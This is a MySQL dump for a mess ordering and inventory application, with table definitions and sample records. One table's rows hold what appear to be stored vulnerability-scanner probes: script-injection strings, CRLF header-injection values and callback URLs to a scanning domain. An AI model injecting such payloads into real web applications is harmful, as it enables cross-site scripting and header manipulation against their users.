INSERT INTO `establishments_copy1` VALUES (346, '1234', '1234(', '1', NULL, '1', '2023-01-17 10:27:34', '2023-01-17 10:27:34', NULL);
INSERT INTO `establishments_copy1` VALUES (347, '1234<', '1234', '1', NULL, '1', '2023-01-17 10:27:34', '2023-01-17 10:27:34', NULL);
INSERT INTO `establishments_copy1` VALUES (348, '1234(', '1234', '1', NULL, '1', '2023-01-17 10:27:34', '2023-01-17 10:27:34', NULL);
INSERT INTO `establishments_copy1` VALUES (349, '1234,', '1234', '1', NULL, '1', '2023-01-17 10:27:35', '2023-01-17 10:27:35', NULL);
INSERT INTO `establishments_copy1` VALUES (350, '1234', '1234,', '1', NULL, '1', '2023-01-17 10:27:35', '2023-01-17 10:27:35', NULL);
INSERT INTO `establishments_copy1` VALUES (351, '1234', '1234+', '1', NULL, '1', '2023-01-17 10:27:35', '2023-01-17 10:27:35', NULL);
INSERT INTO `establishments_copy1` VALUES (352, '1234+', '1234', '1', NULL, '1', '2023-01-17 10:27:35', '2023-01-17 10:27:35', NULL);
INSERT INTO `establishments_copy1` VALUES (353, '1234', '1234\"', '1', NULL, '1', '2023-01-17 10:27:35', '2023-01-17 10:27:35', NULL);
INSERT INTO `establishments_copy1` VALUES (354, '1234\"', '1234', '1', NULL, '1', '2023-01-17 10:27:35', '2023-01-17 10:27:35', NULL);
INSERT INTO `establishments_copy1` VALUES (355, '1234', '1234>', '1', NULL, '1', '2023-01-17 10:27:35', '2023-01-17 10:27:35', NULL);
INSERT INTO `establishments_copy1` VALUES (356, '1234>', '1234', '1', NULL, '1', '2023-01-17 10:27:35', '2023-01-17 10:27:35', NULL);
INSERT INTO `establishments_copy1` VALUES (357, '1234;', '1234', '1', NULL, '1', '2023-01-17 10:27:35', '2023-01-17 10:27:35', NULL);
INSERT INTO `establishments_copy1` VALUES (358, '1234', 'v3-ping-3634-ee19c86f-966d-4d2e-a3d7-8bb79291723d.securityip.appsechcl.com', '1', NULL, '1', '2023-01-17 10:27:35', '2023-01-17 10:27:35', NULL);
INSERT INTO `establishments_copy1` VALUES (359, '1234', '1234;', '1', NULL, '1', '2023-01-17 10:27:36', '2023-01-17 10:27:36', NULL);
INSERT INTO `establishments_copy1` VALUES (360, 'v3-ping-3636-738786e9-9250-4b12-9262-ce766a2ebdbe.securityip.appsechcl.com', '1234', '1', NULL, '1', '2023-01-17 10:27:36', '2023-01-17 10:27:36', NULL);
INSERT INTO `establishments_copy1` VALUES (361, '1234', 'http://v3-ping-3637-ee19c86f-966d-4d2e-a3d7-8bb79291723d.securityip.appsechcl.com', '1', NULL, '1', '2023-01-17 10:27:36', '2023-01-17 10:27:36', NULL);
INSERT INTO `establishments_copy1` VALUES (362, 'http://v3-ping-3638-738786e9-9250-4b12-9262-ce766a2ebdbe.securityip.appsechcl.com', '1234', '1', NULL, '1', '2023-01-17 10:27:36', '2023-01-17 10:27:36', NULL);
INSERT INTO `establishments_copy1` VALUES (363, 'yw<script>alert(337)</script>yw', '1234', '1', NULL, '1', '2023-01-17 10:27:36', '2023-01-17 10:27:36', NULL);
INSERT INTO `establishments_copy1` VALUES (364, '1234', 'http://1234@v3-ping-3639-ee19c86f-966d-4d2e-a3d7-8bb79291723d.securityip.appsechcl.com', '1', NULL, '1', '2023-01-17 10:27:36', '2023-01-17 10:27:36', NULL);
INSERT INTO `establishments_copy1` VALUES (365, 'http://1234@v3-ping-3641-738786e9-9250-4b12-9262-ce766a2ebdbe.securityip.appsechcl.com', '1234', '1', NULL, '1', '2023-01-17 10:27:36', '2023-01-17 10:27:36', NULL);
INSERT INTO `establishments_copy1` VALUES (366, '1234\"\'Aywdtprobejq00014Byw\'\"A', '1234', '1', NULL, '1', '2023-01-17 10:27:37', '2023-01-17 10:27:37', NULL);
INSERT INTO `establishments_copy1` VALUES (367, '1234\"\'Aywdtprobejq00014Byw\'\"A', '1234', '1', NULL, '1', '2023-01-17 10:27:37', '2023-01-17 10:27:37', NULL);
INSERT INTO `establishments_copy1` VALUES (368, '1234', '1234\r\nAppScanHeader: AppScanValue/1.2-3655\r\nSecondAppScanHeader: whatever', '1', NULL, '1', '2023-01-17 10:27:37', '2023-01-17 10:27:37', NULL);
INSERT INTO `establishments_copy1` VALUES (369, '1234\r\nAppScanHeader: AppScanValue/1.2-3667\r\nSecondAppScanHeader: whatever', '1234', '1', NULL, '1', '2023-01-17 10:27:38', '2023-01-17 10:27:38', NULL);
INSERT INTO `establishments_copy1` VALUES (370, '1234\"\'Ayw<script>alert(338)</script>yw\'\"A', '1234', '1', NULL, '1', '2023-01-17 10:27:38', '2023-01-17 10:27:38', NULL);
INSERT INTO `establishments_copy1` VALUES (371, '1234', 'ywdtprobejq00014Ayw', '1', NULL, '1', '2023-01-17 10:27:38', '2023-01-17 10:27:38', NULL);
INSERT INTO `establishments_copy1` VALUES (372, '1234', '1234XYZ', '1', NULL, '1', '2023-01-17 10:27:38', '2023-01-17 10:27:38', NULL);
INSERT INTO `establishments_copy1` VALUES (373, '1234', 'ywdtprobejq00014Ayw', '1', NULL, '1', '2023-01-17 10:27:39', '2023-01-17 10:27:39', NULL);
INSERT INTO `establishments_copy1` VALUES (374, '1234XYZ', '1234', '1', NULL, '1', '2023-01-17 10:27:39', '2023-01-17 10:27:39', NULL);
INSERT INTO `establishments_copy1` VALUES (375, '1234\"\'Ayw<script>alert(339)</script>yw\'\"A', '1234', '1', NULL, '1', '2023-01-17 10:27:40', '2023-01-17 10:27:40', NULL);
INSERT INTO `establishments_copy1` VALUES (376, '1234', 'yw<script>alert(340)</script>yw', '1', NULL, '1', '2023-01-17 10:27:41', '2023-01-17 10:27:41', NULL);
INSERT INTO `establishments_copy1` VALUES (377, '1234', 'yw<script>alert(341)</script>yw', '1', NULL, '1', '2023-01-17 10:27:42', '2023-01-17 10:27:42', NULL);
INSERT INTO `establishments_copy1` VALUES (378, '1234', 'yw<script>alert(342)</script>yw', '1', NULL, '1', '2023-01-17 10:27:43', '2023-01-17 10:27:43', NULL);
INSERT INTO `establishments_copy1` VALUES (379, '1234', '1234\"\'Aywdtprobejq00014Ayw\'\"A', '1', NULL, '1', '2023-01-17 10:27:44', '2023-01-17 10:27:44', NULL);
INSERT INTO `establishments_copy1` VALUES (380, '1234', '1234\"\'Aywdtprobejq00014Ayw\'\"A', '1', NULL, '1', '2023-01-17 10:27:44', '2023-01-17 10:27:44', NULL);
INSERT INTO `establishments_copy1` VALUES (381, '1234', '1234\"\'Ayw<script>alert(343)</script>yw\'\"A', '1', NULL, '1', '2023-01-17 10:27:45', '2023-01-17 10:27:45', NULL);
INSERT INTO `establishments_copy1` VALUES (382, '1234', '1234\"\'Ayw<script>alert(344)</script>yw\'\"A', '1', NULL, '1', '2023-01-17 10:27:45', '2023-01-17 10:27:45', NULL);
INSERT INTO `establishments_copy1` VALUES (383, '1234', '1234\"\'Ayw<script>alert(346)</script>yw\'\"A', '1', NULL, '1', '2023-01-17 10:27:47', '2023-01-17 10:27:47', NULL);
INSERT INTO `establishments_copy1` VALUES (384, '1234', '1234\"\'Ayw<script>alert(347)</script>yw\'\"A', '1', NULL, '1', '2023-01-17 10:27:47', '2023-01-17 10:27:47', NULL);

-- ----------------------------
-- Table structure for event_order_details
-- ----------------------------
DROP TABLE IF EXISTS `event_order_details`;
CREATE TABLE `event_order_details`  (
  `id` bigint UNSIGNED NOT NULL AUTO_INCREMENT,
  `event_order_id` int NOT NULL,
  `item` int NOT NULL,
  `meal_type` int NOT NULL,
  `qty` int NOT NULL,
  `created_by` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `updated_by` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `version` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `deleted_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of event_order_details
-- ----------------------------

-- ----------------------------
-- Table structure for event_orders
-- ----------------------------
DROP TABLE IF EXISTS `event_orders`;
CREATE TABLE `event_orders`  (
  `id` bigint UNSIGNED NOT NULL AUTO_INCREMENT,
  `event_name` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `officer_id` int NOT NULL,
  `appointment` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `officer_contact` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `due_date` date NOT NULL,
  `due_time` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `status` int NOT NULL,
  `accepted_by` int NULL DEFAULT NULL,
  `created_by` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `updated_by` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `version` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `deleted_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of event_orders
-- ----------------------------

-- ----------------------------
-- Table structure for extra_orders
-- ----------------------------
DROP TABLE IF EXISTS `extra_orders`;
CREATE TABLE `extra_orders`  (
  `id` bigint UNSIGNED NOT NULL AUTO_INCREMENT,
  `mess_id` int NOT NULL,
  `officer_id` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `item_id` int NOT NULL,
  `meal_time` int NOT NULL,
  `qty` int NOT NULL,
  `price` int NOT NULL,
  `price_final` double(5, 2) NULL DEFAULT NULL,
  `ordered_date` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `notification` int NULL DEFAULT NULL,
  `note` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `ip` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `status` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_by` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `deleted_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 4 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of extra_orders
-- ----------------------------
INSERT INTO `extra_orders` VALUES (1, 1, '100380913', 9, 1, 1, 120, NULL, '2023-01-31', 1, NULL, '172.16.66.104', '1', '2', '2023-01-31 10:31:13', '2023-01-31 10:31:29', NULL);
INSERT INTO `extra_orders` VALUES (2, 1, '100008618', 8, 1, 1, 290, NULL, '2023-01-31', 1, NULL, '172.16.66.104', '1', '2', '2023-01-31 10:31:24', '2023-01-31 10:31:29', NULL);
INSERT INTO `extra_orders` VALUES (3, 1, '100008618', 11, 3, 2, 130, 88.00, '2023-02-01', 1, NULL, '172.16.207.100', '1', '2', '2023-02-01 09:07:39', '2023-02-01 11:12:21', NULL);

-- ----------------------------
-- Table structure for failed_jobs
-- ----------------------------
DROP TABLE IF EXISTS `failed_jobs`;
CREATE TABLE `failed_jobs`  (
  `id` bigint UNSIGNED NOT NULL AUTO_INCREMENT,
  `uuid` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `connection` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `queue` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `payload` longtext CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `exception` longtext CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `failed_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`) USING BTREE,
  UNIQUE INDEX `failed_jobs_uuid_unique`(`uuid` ASC) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of failed_jobs
-- ----------------------------

-- ----------------------------
-- Table structure for g_r_n_details
-- ----------------------------
DROP TABLE IF EXISTS `g_r_n_details`;
CREATE TABLE `g_r_n_details`  (
  `id` bigint UNSIGNED NOT NULL AUTO_INCREMENT,
  `header_id` bigint UNSIGNED NULL DEFAULT NULL,
  `item_id` bigint UNSIGNED NULL DEFAULT NULL,
  `qty` double NOT NULL DEFAULT 0,
  `avl_qty` double NOT NULL DEFAULT 0,
  `unit_price` double(20, 2) NOT NULL DEFAULT 0.00,
  `expire_date` date NULL DEFAULT NULL,
  `manufacture_date` date NULL DEFAULT NULL,
  `active` tinyint NOT NULL DEFAULT 1,
  `ip` varchar(15) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `creater_id` bigint UNSIGNED NULL DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE,
  INDEX `g_r_n_details_header_id_index`(`header_id` ASC) USING BTREE,
  INDEX `g_r_n_details_item_id_index`(`item_id` ASC) USING BTREE,
  INDEX `g_r_n_details_creater_id_index`(`creater_id` ASC) USING BTREE,
  CONSTRAINT `g_r_n_details_creater_id_foreign` FOREIGN KEY (`creater_id`) REFERENCES `admins` (`id`) ON DELETE CASCADE ON UPDATE RESTRICT,
  CONSTRAINT `g_r_n_details_header_id_foreign` FOREIGN KEY (`header_id`) REFERENCES `g_r_n_headers` (`id`) ON DELETE CASCADE ON UPDATE RESTRICT,
  CONSTRAINT `g_r_n_details_item_id_foreign` FOREIGN KEY (`item_id`) REFERENCES `items` (`id`) ON DELETE CASCADE ON UPDATE RESTRICT
) ENGINE = InnoDB AUTO_INCREMENT = 4 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of g_r_n_details
-- ----------------------------
INSERT INTO `g_r_n_details` VALUES (1, 1, 3, 60, 60, 278.00, '2025-06-12', '2022-01-04', 1, '172.16.207.100', 2, '2023-02-01 09:20:14', '2023-02-01 09:20:14');
INSERT INTO `g_r_n_details` VALUES (2, 1, 2, 50, 50, 490.00, '2024-02-07', '2022-02-08', 1, '172.16.207.100', 2, '2023-02-01 09:20:45', '2023-02-01 09:20:45');
INSERT INTO `g_r_n_details` VALUES (3, 1, 1, 8, 8, 89900.00, '2023-03-24', '2022-02-15', 1, '172.16.207.100', 2, '2023-02-01 09:21:23', '2023-02-01 09:21:23');

-- ----------------------------
-- Table structure for g_r_n_headers
-- ----------------------------
DROP TABLE IF EXISTS `g_r_n_headers`;
CREATE TABLE `g_r_n_headers`  (
  `id` bigint UNSIGNED NOT NULL AUTO_INCREMENT,
  `no` varchar(10) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `date` date NOT NULL,
  `order_no` varchar(10) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `supplier_id` bigint UNSIGNED NULL DEFAULT NULL,
  `remarks` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `active` tinyint NOT NULL DEFAULT 1,
  `establishment_id` bigint UNSIGNED NULL DEFAULT NULL,
  `ip` varchar(15) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `creater_id` bigint UNSIGNED NULL DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE,
  INDEX `g_r_n_headers_supplier_id_index`(`supplier_id` ASC) USING BTREE,
  INDEX `g_r_n_headers_establishment_id_index`(`establishment_id` ASC) USING BTREE,
  INDEX `g_r_n_headers_creater_id_index`(`creater_id` ASC) USING BTREE,
  CONSTRAINT `g_r_n_header_creater_id_foreign` FOREIGN KEY (`creater_id`) REFERENCES `admins` (`id`) ON DELETE CASCADE ON UPDATE RESTRICT,
  CONSTRAINT `g_r_n_headers_establishment_id_foreign` FOREIGN KEY (`establishment_id`) REFERENCES `messes` (`id`) ON DELETE CASCADE ON UPDATE RESTRICT,
  CONSTRAINT `g_r_n_headers_supplier_id_foreign` FOREIGN KEY (`supplier_id`) REFERENCES `suppliers` (`id`) ON DELETE CASCADE ON UPDATE RESTRICT
) ENGINE = InnoDB AUTO_INCREMENT = 2 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of g_r_n_headers
-- ----------------------------
INSERT INTO `g_r_n_headers` VALUES (1, 'grn/548', '2023-02-01', '0000000001', 1, 'T', 1, 1, NULL, NULL, '2023-02-01 09:19:27', '2023-02-01 09:19:27');

-- ----------------------------
-- Table structure for issue_details
-- ----------------------------
DROP TABLE IF EXISTS `issue_details`;
CREATE TABLE `issue_details`  (
  `id` bigint UNSIGNED NOT NULL AUTO_INCREMENT,
  `header_id` bigint UNSIGNED NULL DEFAULT NULL,
  `item_id` bigint UNSIGNED NULL DEFAULT NULL,
  `qty` double NOT NULL DEFAULT 0,
  `active` tinyint NOT NULL DEFAULT 1,
  `ip` varchar(15) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `creater_id` bigint UNSIGNED NULL DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE,
  INDEX `issue_details_header_id_index`(`header_id` ASC) USING BTREE,
  INDEX `issue_details_item_id_index`(`item_id` ASC) USING BTREE,
  INDEX `issue_details_creater_id_index`(`creater_id` ASC) USING BTREE,
  CONSTRAINT `issue_details_creater_id_foreign` FOREIGN KEY (`creater_id`) REFERENCES `admins` (`id`) ON DELETE CASCADE ON UPDATE RESTRICT,
  CONSTRAINT `issue_details_header_id_foreign` FOREIGN KEY (`header_id`) REFERENCES `issue_headers` (`id`) ON DELETE CASCADE ON UPDATE RESTRICT,
  CONSTRAINT `issue_details_item_id_foreign` FOREIGN KEY (`item_id`) REFERENCES `items` (`id`) ON DELETE CASCADE ON UPDATE RESTRICT
) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of issue_details
-- ----------------------------

-- ----------------------------
-- Table structure for issue_headers
-- ----------------------------
DROP TABLE IF EXISTS `issue_headers`;
CREATE TABLE `issue_headers`  (
  `id` bigint UNSIGNED NOT NULL AUTO_INCREMENT,
  `no` varchar(10) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `date` date NOT NULL,
  `service_no` varchar(10) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `order_no` varchar(10) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `establishment_id` bigint UNSIGNED NULL DEFAULT NULL,
  `active` tinyint NOT NULL DEFAULT 1,
  `ip` varchar(15) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `creater_id` bigint UNSIGNED NULL DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `remarks` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  PRIMARY KEY (`id`) USING BTREE,
  INDEX `issue_headers_establishment_id_index`(`establishment_id` ASC) USING BTREE,
  INDEX `issue_headers_creater_id_index`(`creater_id` ASC) USING BTREE,
  CONSTRAINT `issue_headers_creater_id_foreign` FOREIGN KEY (`creater_id`) REFERENCES `admins` (`id`) ON DELETE CASCADE ON UPDATE RESTRICT,
  CONSTRAINT `issue_headers_establishment_id_foreign` FOREIGN KEY (`establishment_id`) REFERENCES `messes` (`id`) ON DELETE CASCADE ON UPDATE RESTRICT
) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of issue_headers
-- ----------------------------

-- ----------------------------
-- Table structure for items
-- ----------------------------
DROP TABLE IF EXISTS `items`;
CREATE TABLE `items`  (
  `id` bigint UNSIGNED NOT NULL AUTO_INCREMENT,
  `code` int NOT NULL,
  `name` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `measure_unit_id` bigint UNSIGNED NOT NULL,
  `latest_user_tbl_id` int NOT NULL,
  `latest_ip` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `active` tinyint NOT NULL DEFAULT 1,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `establishment_id` bigint UNSIGNED NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE,
  INDEX `items_measure_unit_id_index`(`measure_unit_id` ASC) USING BTREE,
  INDEX `items_establishment_id_index`(`establishment_id` ASC) USING BTREE,
  CONSTRAINT `items_establishment_id_foreign` FOREIGN KEY (`establishment_id`) REFERENCES `messes` (`id`) ON DELETE CASCADE ON UPDATE RESTRICT,
  CONSTRAINT `items_measure_unit_id_foreign` FOREIGN KEY (`measure_unit_id`) REFERENCES `measure_units` (`id`) ON DELETE CASCADE ON UPDATE RESTRICT
) ENGINE = InnoDB AUTO_INCREMENT = 4 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of items
-- ----------------------------
INSERT INTO `items` VALUES (1, 563318476, 'Green Label', 3, 2, '172.16.207.100', 1, '2023-02-01 09:15:55', '2023-02-01 09:15:55', 1);
INSERT INTO `items` VALUES (2, 875894792, 'Strong', 7, 2, '172.16.207.100', 1, '2023-02-01 09:16:27', '2023-02-01 09:16:27', 1);
INSERT INTO `items` VALUES (3, 32445462, 'Shoe polish', 8, 2, '172.16.207.100', 1, '2023-02-01 09:17:54', '2023-02-01 09:17:54', 1);

-- ----------------------------
-- Table structure for logo_images
-- ----------------------------
DROP TABLE IF EXISTS `logo_images`;
CREATE TABLE `logo_images`  (
  `id` bigint UNSIGNED NOT NULL AUTO_INCREMENT,
  `path` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `mess_id` int NULL DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of logo_images
-- ----------------------------

-- ----------------------------
-- Table structure for meal_order_times
-- ----------------------------
DROP TABLE IF EXISTS `meal_order_times`;
CREATE TABLE `meal_order_times`  (
  `id` bigint UNSIGNED NOT NULL AUTO_INCREMENT,
  `mess_id` int NOT NULL,
  `for_breakfast` time NOT NULL,
  `for_lunch` time NOT NULL,
  `for_dinner` time NOT NULL,
  `created_by` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `updated_by` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 2 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of meal_order_times
-- ----------------------------
INSERT INTO `meal_order_times` VALUES (1, 1, '06:00:00', '10:00:00', '15:30:00', '2', NULL, '2023-01-31 10:16:09', '2023-01-31 10:16:09');

-- ----------------------------
-- Table structure for measure_units
-- ----------------------------
DROP TABLE IF EXISTS `measure_units`;
CREATE TABLE `measure_units`  (
  `id` bigint UNSIGNED NOT NULL AUTO_INCREMENT,
  `name` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `abbreviation` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `active` tinyint NOT NULL DEFAULT 1,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `ip` varchar(15) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `creater_id` bigint UNSIGNED NULL DEFAULT NULL,
  `establishment_id` bigint UNSIGNED NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE,
  INDEX `measure_units_creater_id_index`(`creater_id` ASC) USING BTREE,
  INDEX `measure_units_establishment_id_index`(`establishment_id` ASC) USING BTREE,
  CONSTRAINT `measure_units_creater_id_foreign` FOREIGN KEY (`creater_id`) REFERENCES `admins` (`id`) ON DELETE CASCADE ON UPDATE RESTRICT,
  CONSTRAINT `measure_units_establishment_id_foreign` FOREIGN KEY (`establishment_id`) REFERENCES `establishments` (`id`) ON DELETE CASCADE ON UPDATE RESTRICT
) ENGINE = InnoDB AUTO_INCREMENT = 9 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of measure_units
-- ----------------------------
INSERT INTO `measure_units` VALUES (1, 'Liter', 'L', 1, '2023-01-31 09:24:48', '2023-01-31 09:24:48', '172.16.66.104', 1, 1);
INSERT INTO `measure_units` VALUES (2, 'Kill Gram', 'KG', 1, '2023-01-31 09:24:48', '2023-01-31 09:24:48', '172.16.66.104', 1, 1);
INSERT INTO `measure_units` VALUES (3, 'Liter Bottle', '1L Bottle', 1, '2023-01-31 09:24:48', '2023-01-31 09:24:48', '172.16.66.104', 1, 1);
INSERT INTO `measure_units` VALUES (4, '750 Mili Liter Bottle', '750ML Bottle', 1, '2023-01-31 09:24:48', '2023-01-31 09:24:48', '172.16.66.104', 1, 1);
INSERT INTO `measure_units` VALUES (5, 'Tot', 'Tot', 1, '2023-01-31 09:24:48', '2023-01-31 09:24:48', '172.16.66.104', 1, 1);
INSERT INTO `measure_units` VALUES (6, 'Shot', 'Shot', 1, '2023-01-31 09:24:48', '2023-01-31 09:24:48', '172.16.66.104', 1, 1);
INSERT INTO `measure_units` VALUES (7, 'Beer Bottle', 'Beer Bottle', 1, '2023-01-31 09:24:48', '2023-01-31 09:24:48', '172.16.66.104', 1, 1);
INSERT INTO `measure_units` VALUES (8, 'Tin', 'T', 1, '2023-02-01 09:17:30', '2023-02-01 09:17:30', '172.16.207.100', 2, 1);

-- ----------------------------
-- Table structure for mess_daily_rations
-- ----------------------------
DROP TABLE IF EXISTS `mess_daily_rations`;
CREATE TABLE `mess_daily_rations`  (
  `id` bigint UNSIGNED NOT NULL AUTO_INCREMENT,
  `mess_id` int NULL DEFAULT NULL,
  `mess_menu_id` int NOT NULL,
  `dessert_item_id` int NULL DEFAULT NULL,
  `tentative_price` double(10, 2) NOT NULL,
  `price_final` double NULL DEFAULT NULL,
  `meal_time` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `ration_date` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `created_by` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `updated_by` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `version` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `deleted_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 4 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of mess_daily_rations
-- ----------------------------
INSERT INTO `mess_daily_rations` VALUES (1, 1, 1, 6, 200.00, NULL, 'dinner', '2023-01-31', '2', NULL, '1', '2023-01-31 10:00:38', '2023-01-31 10:00:38', NULL);
INSERT INTO `mess_daily_rations` VALUES (2, 1, 2, 7, 250.00, NULL, 'lunch', '2023-01-31', '2', NULL, '1', '2023-01-31 10:00:51', '2023-01-31 10:00:51', NULL);
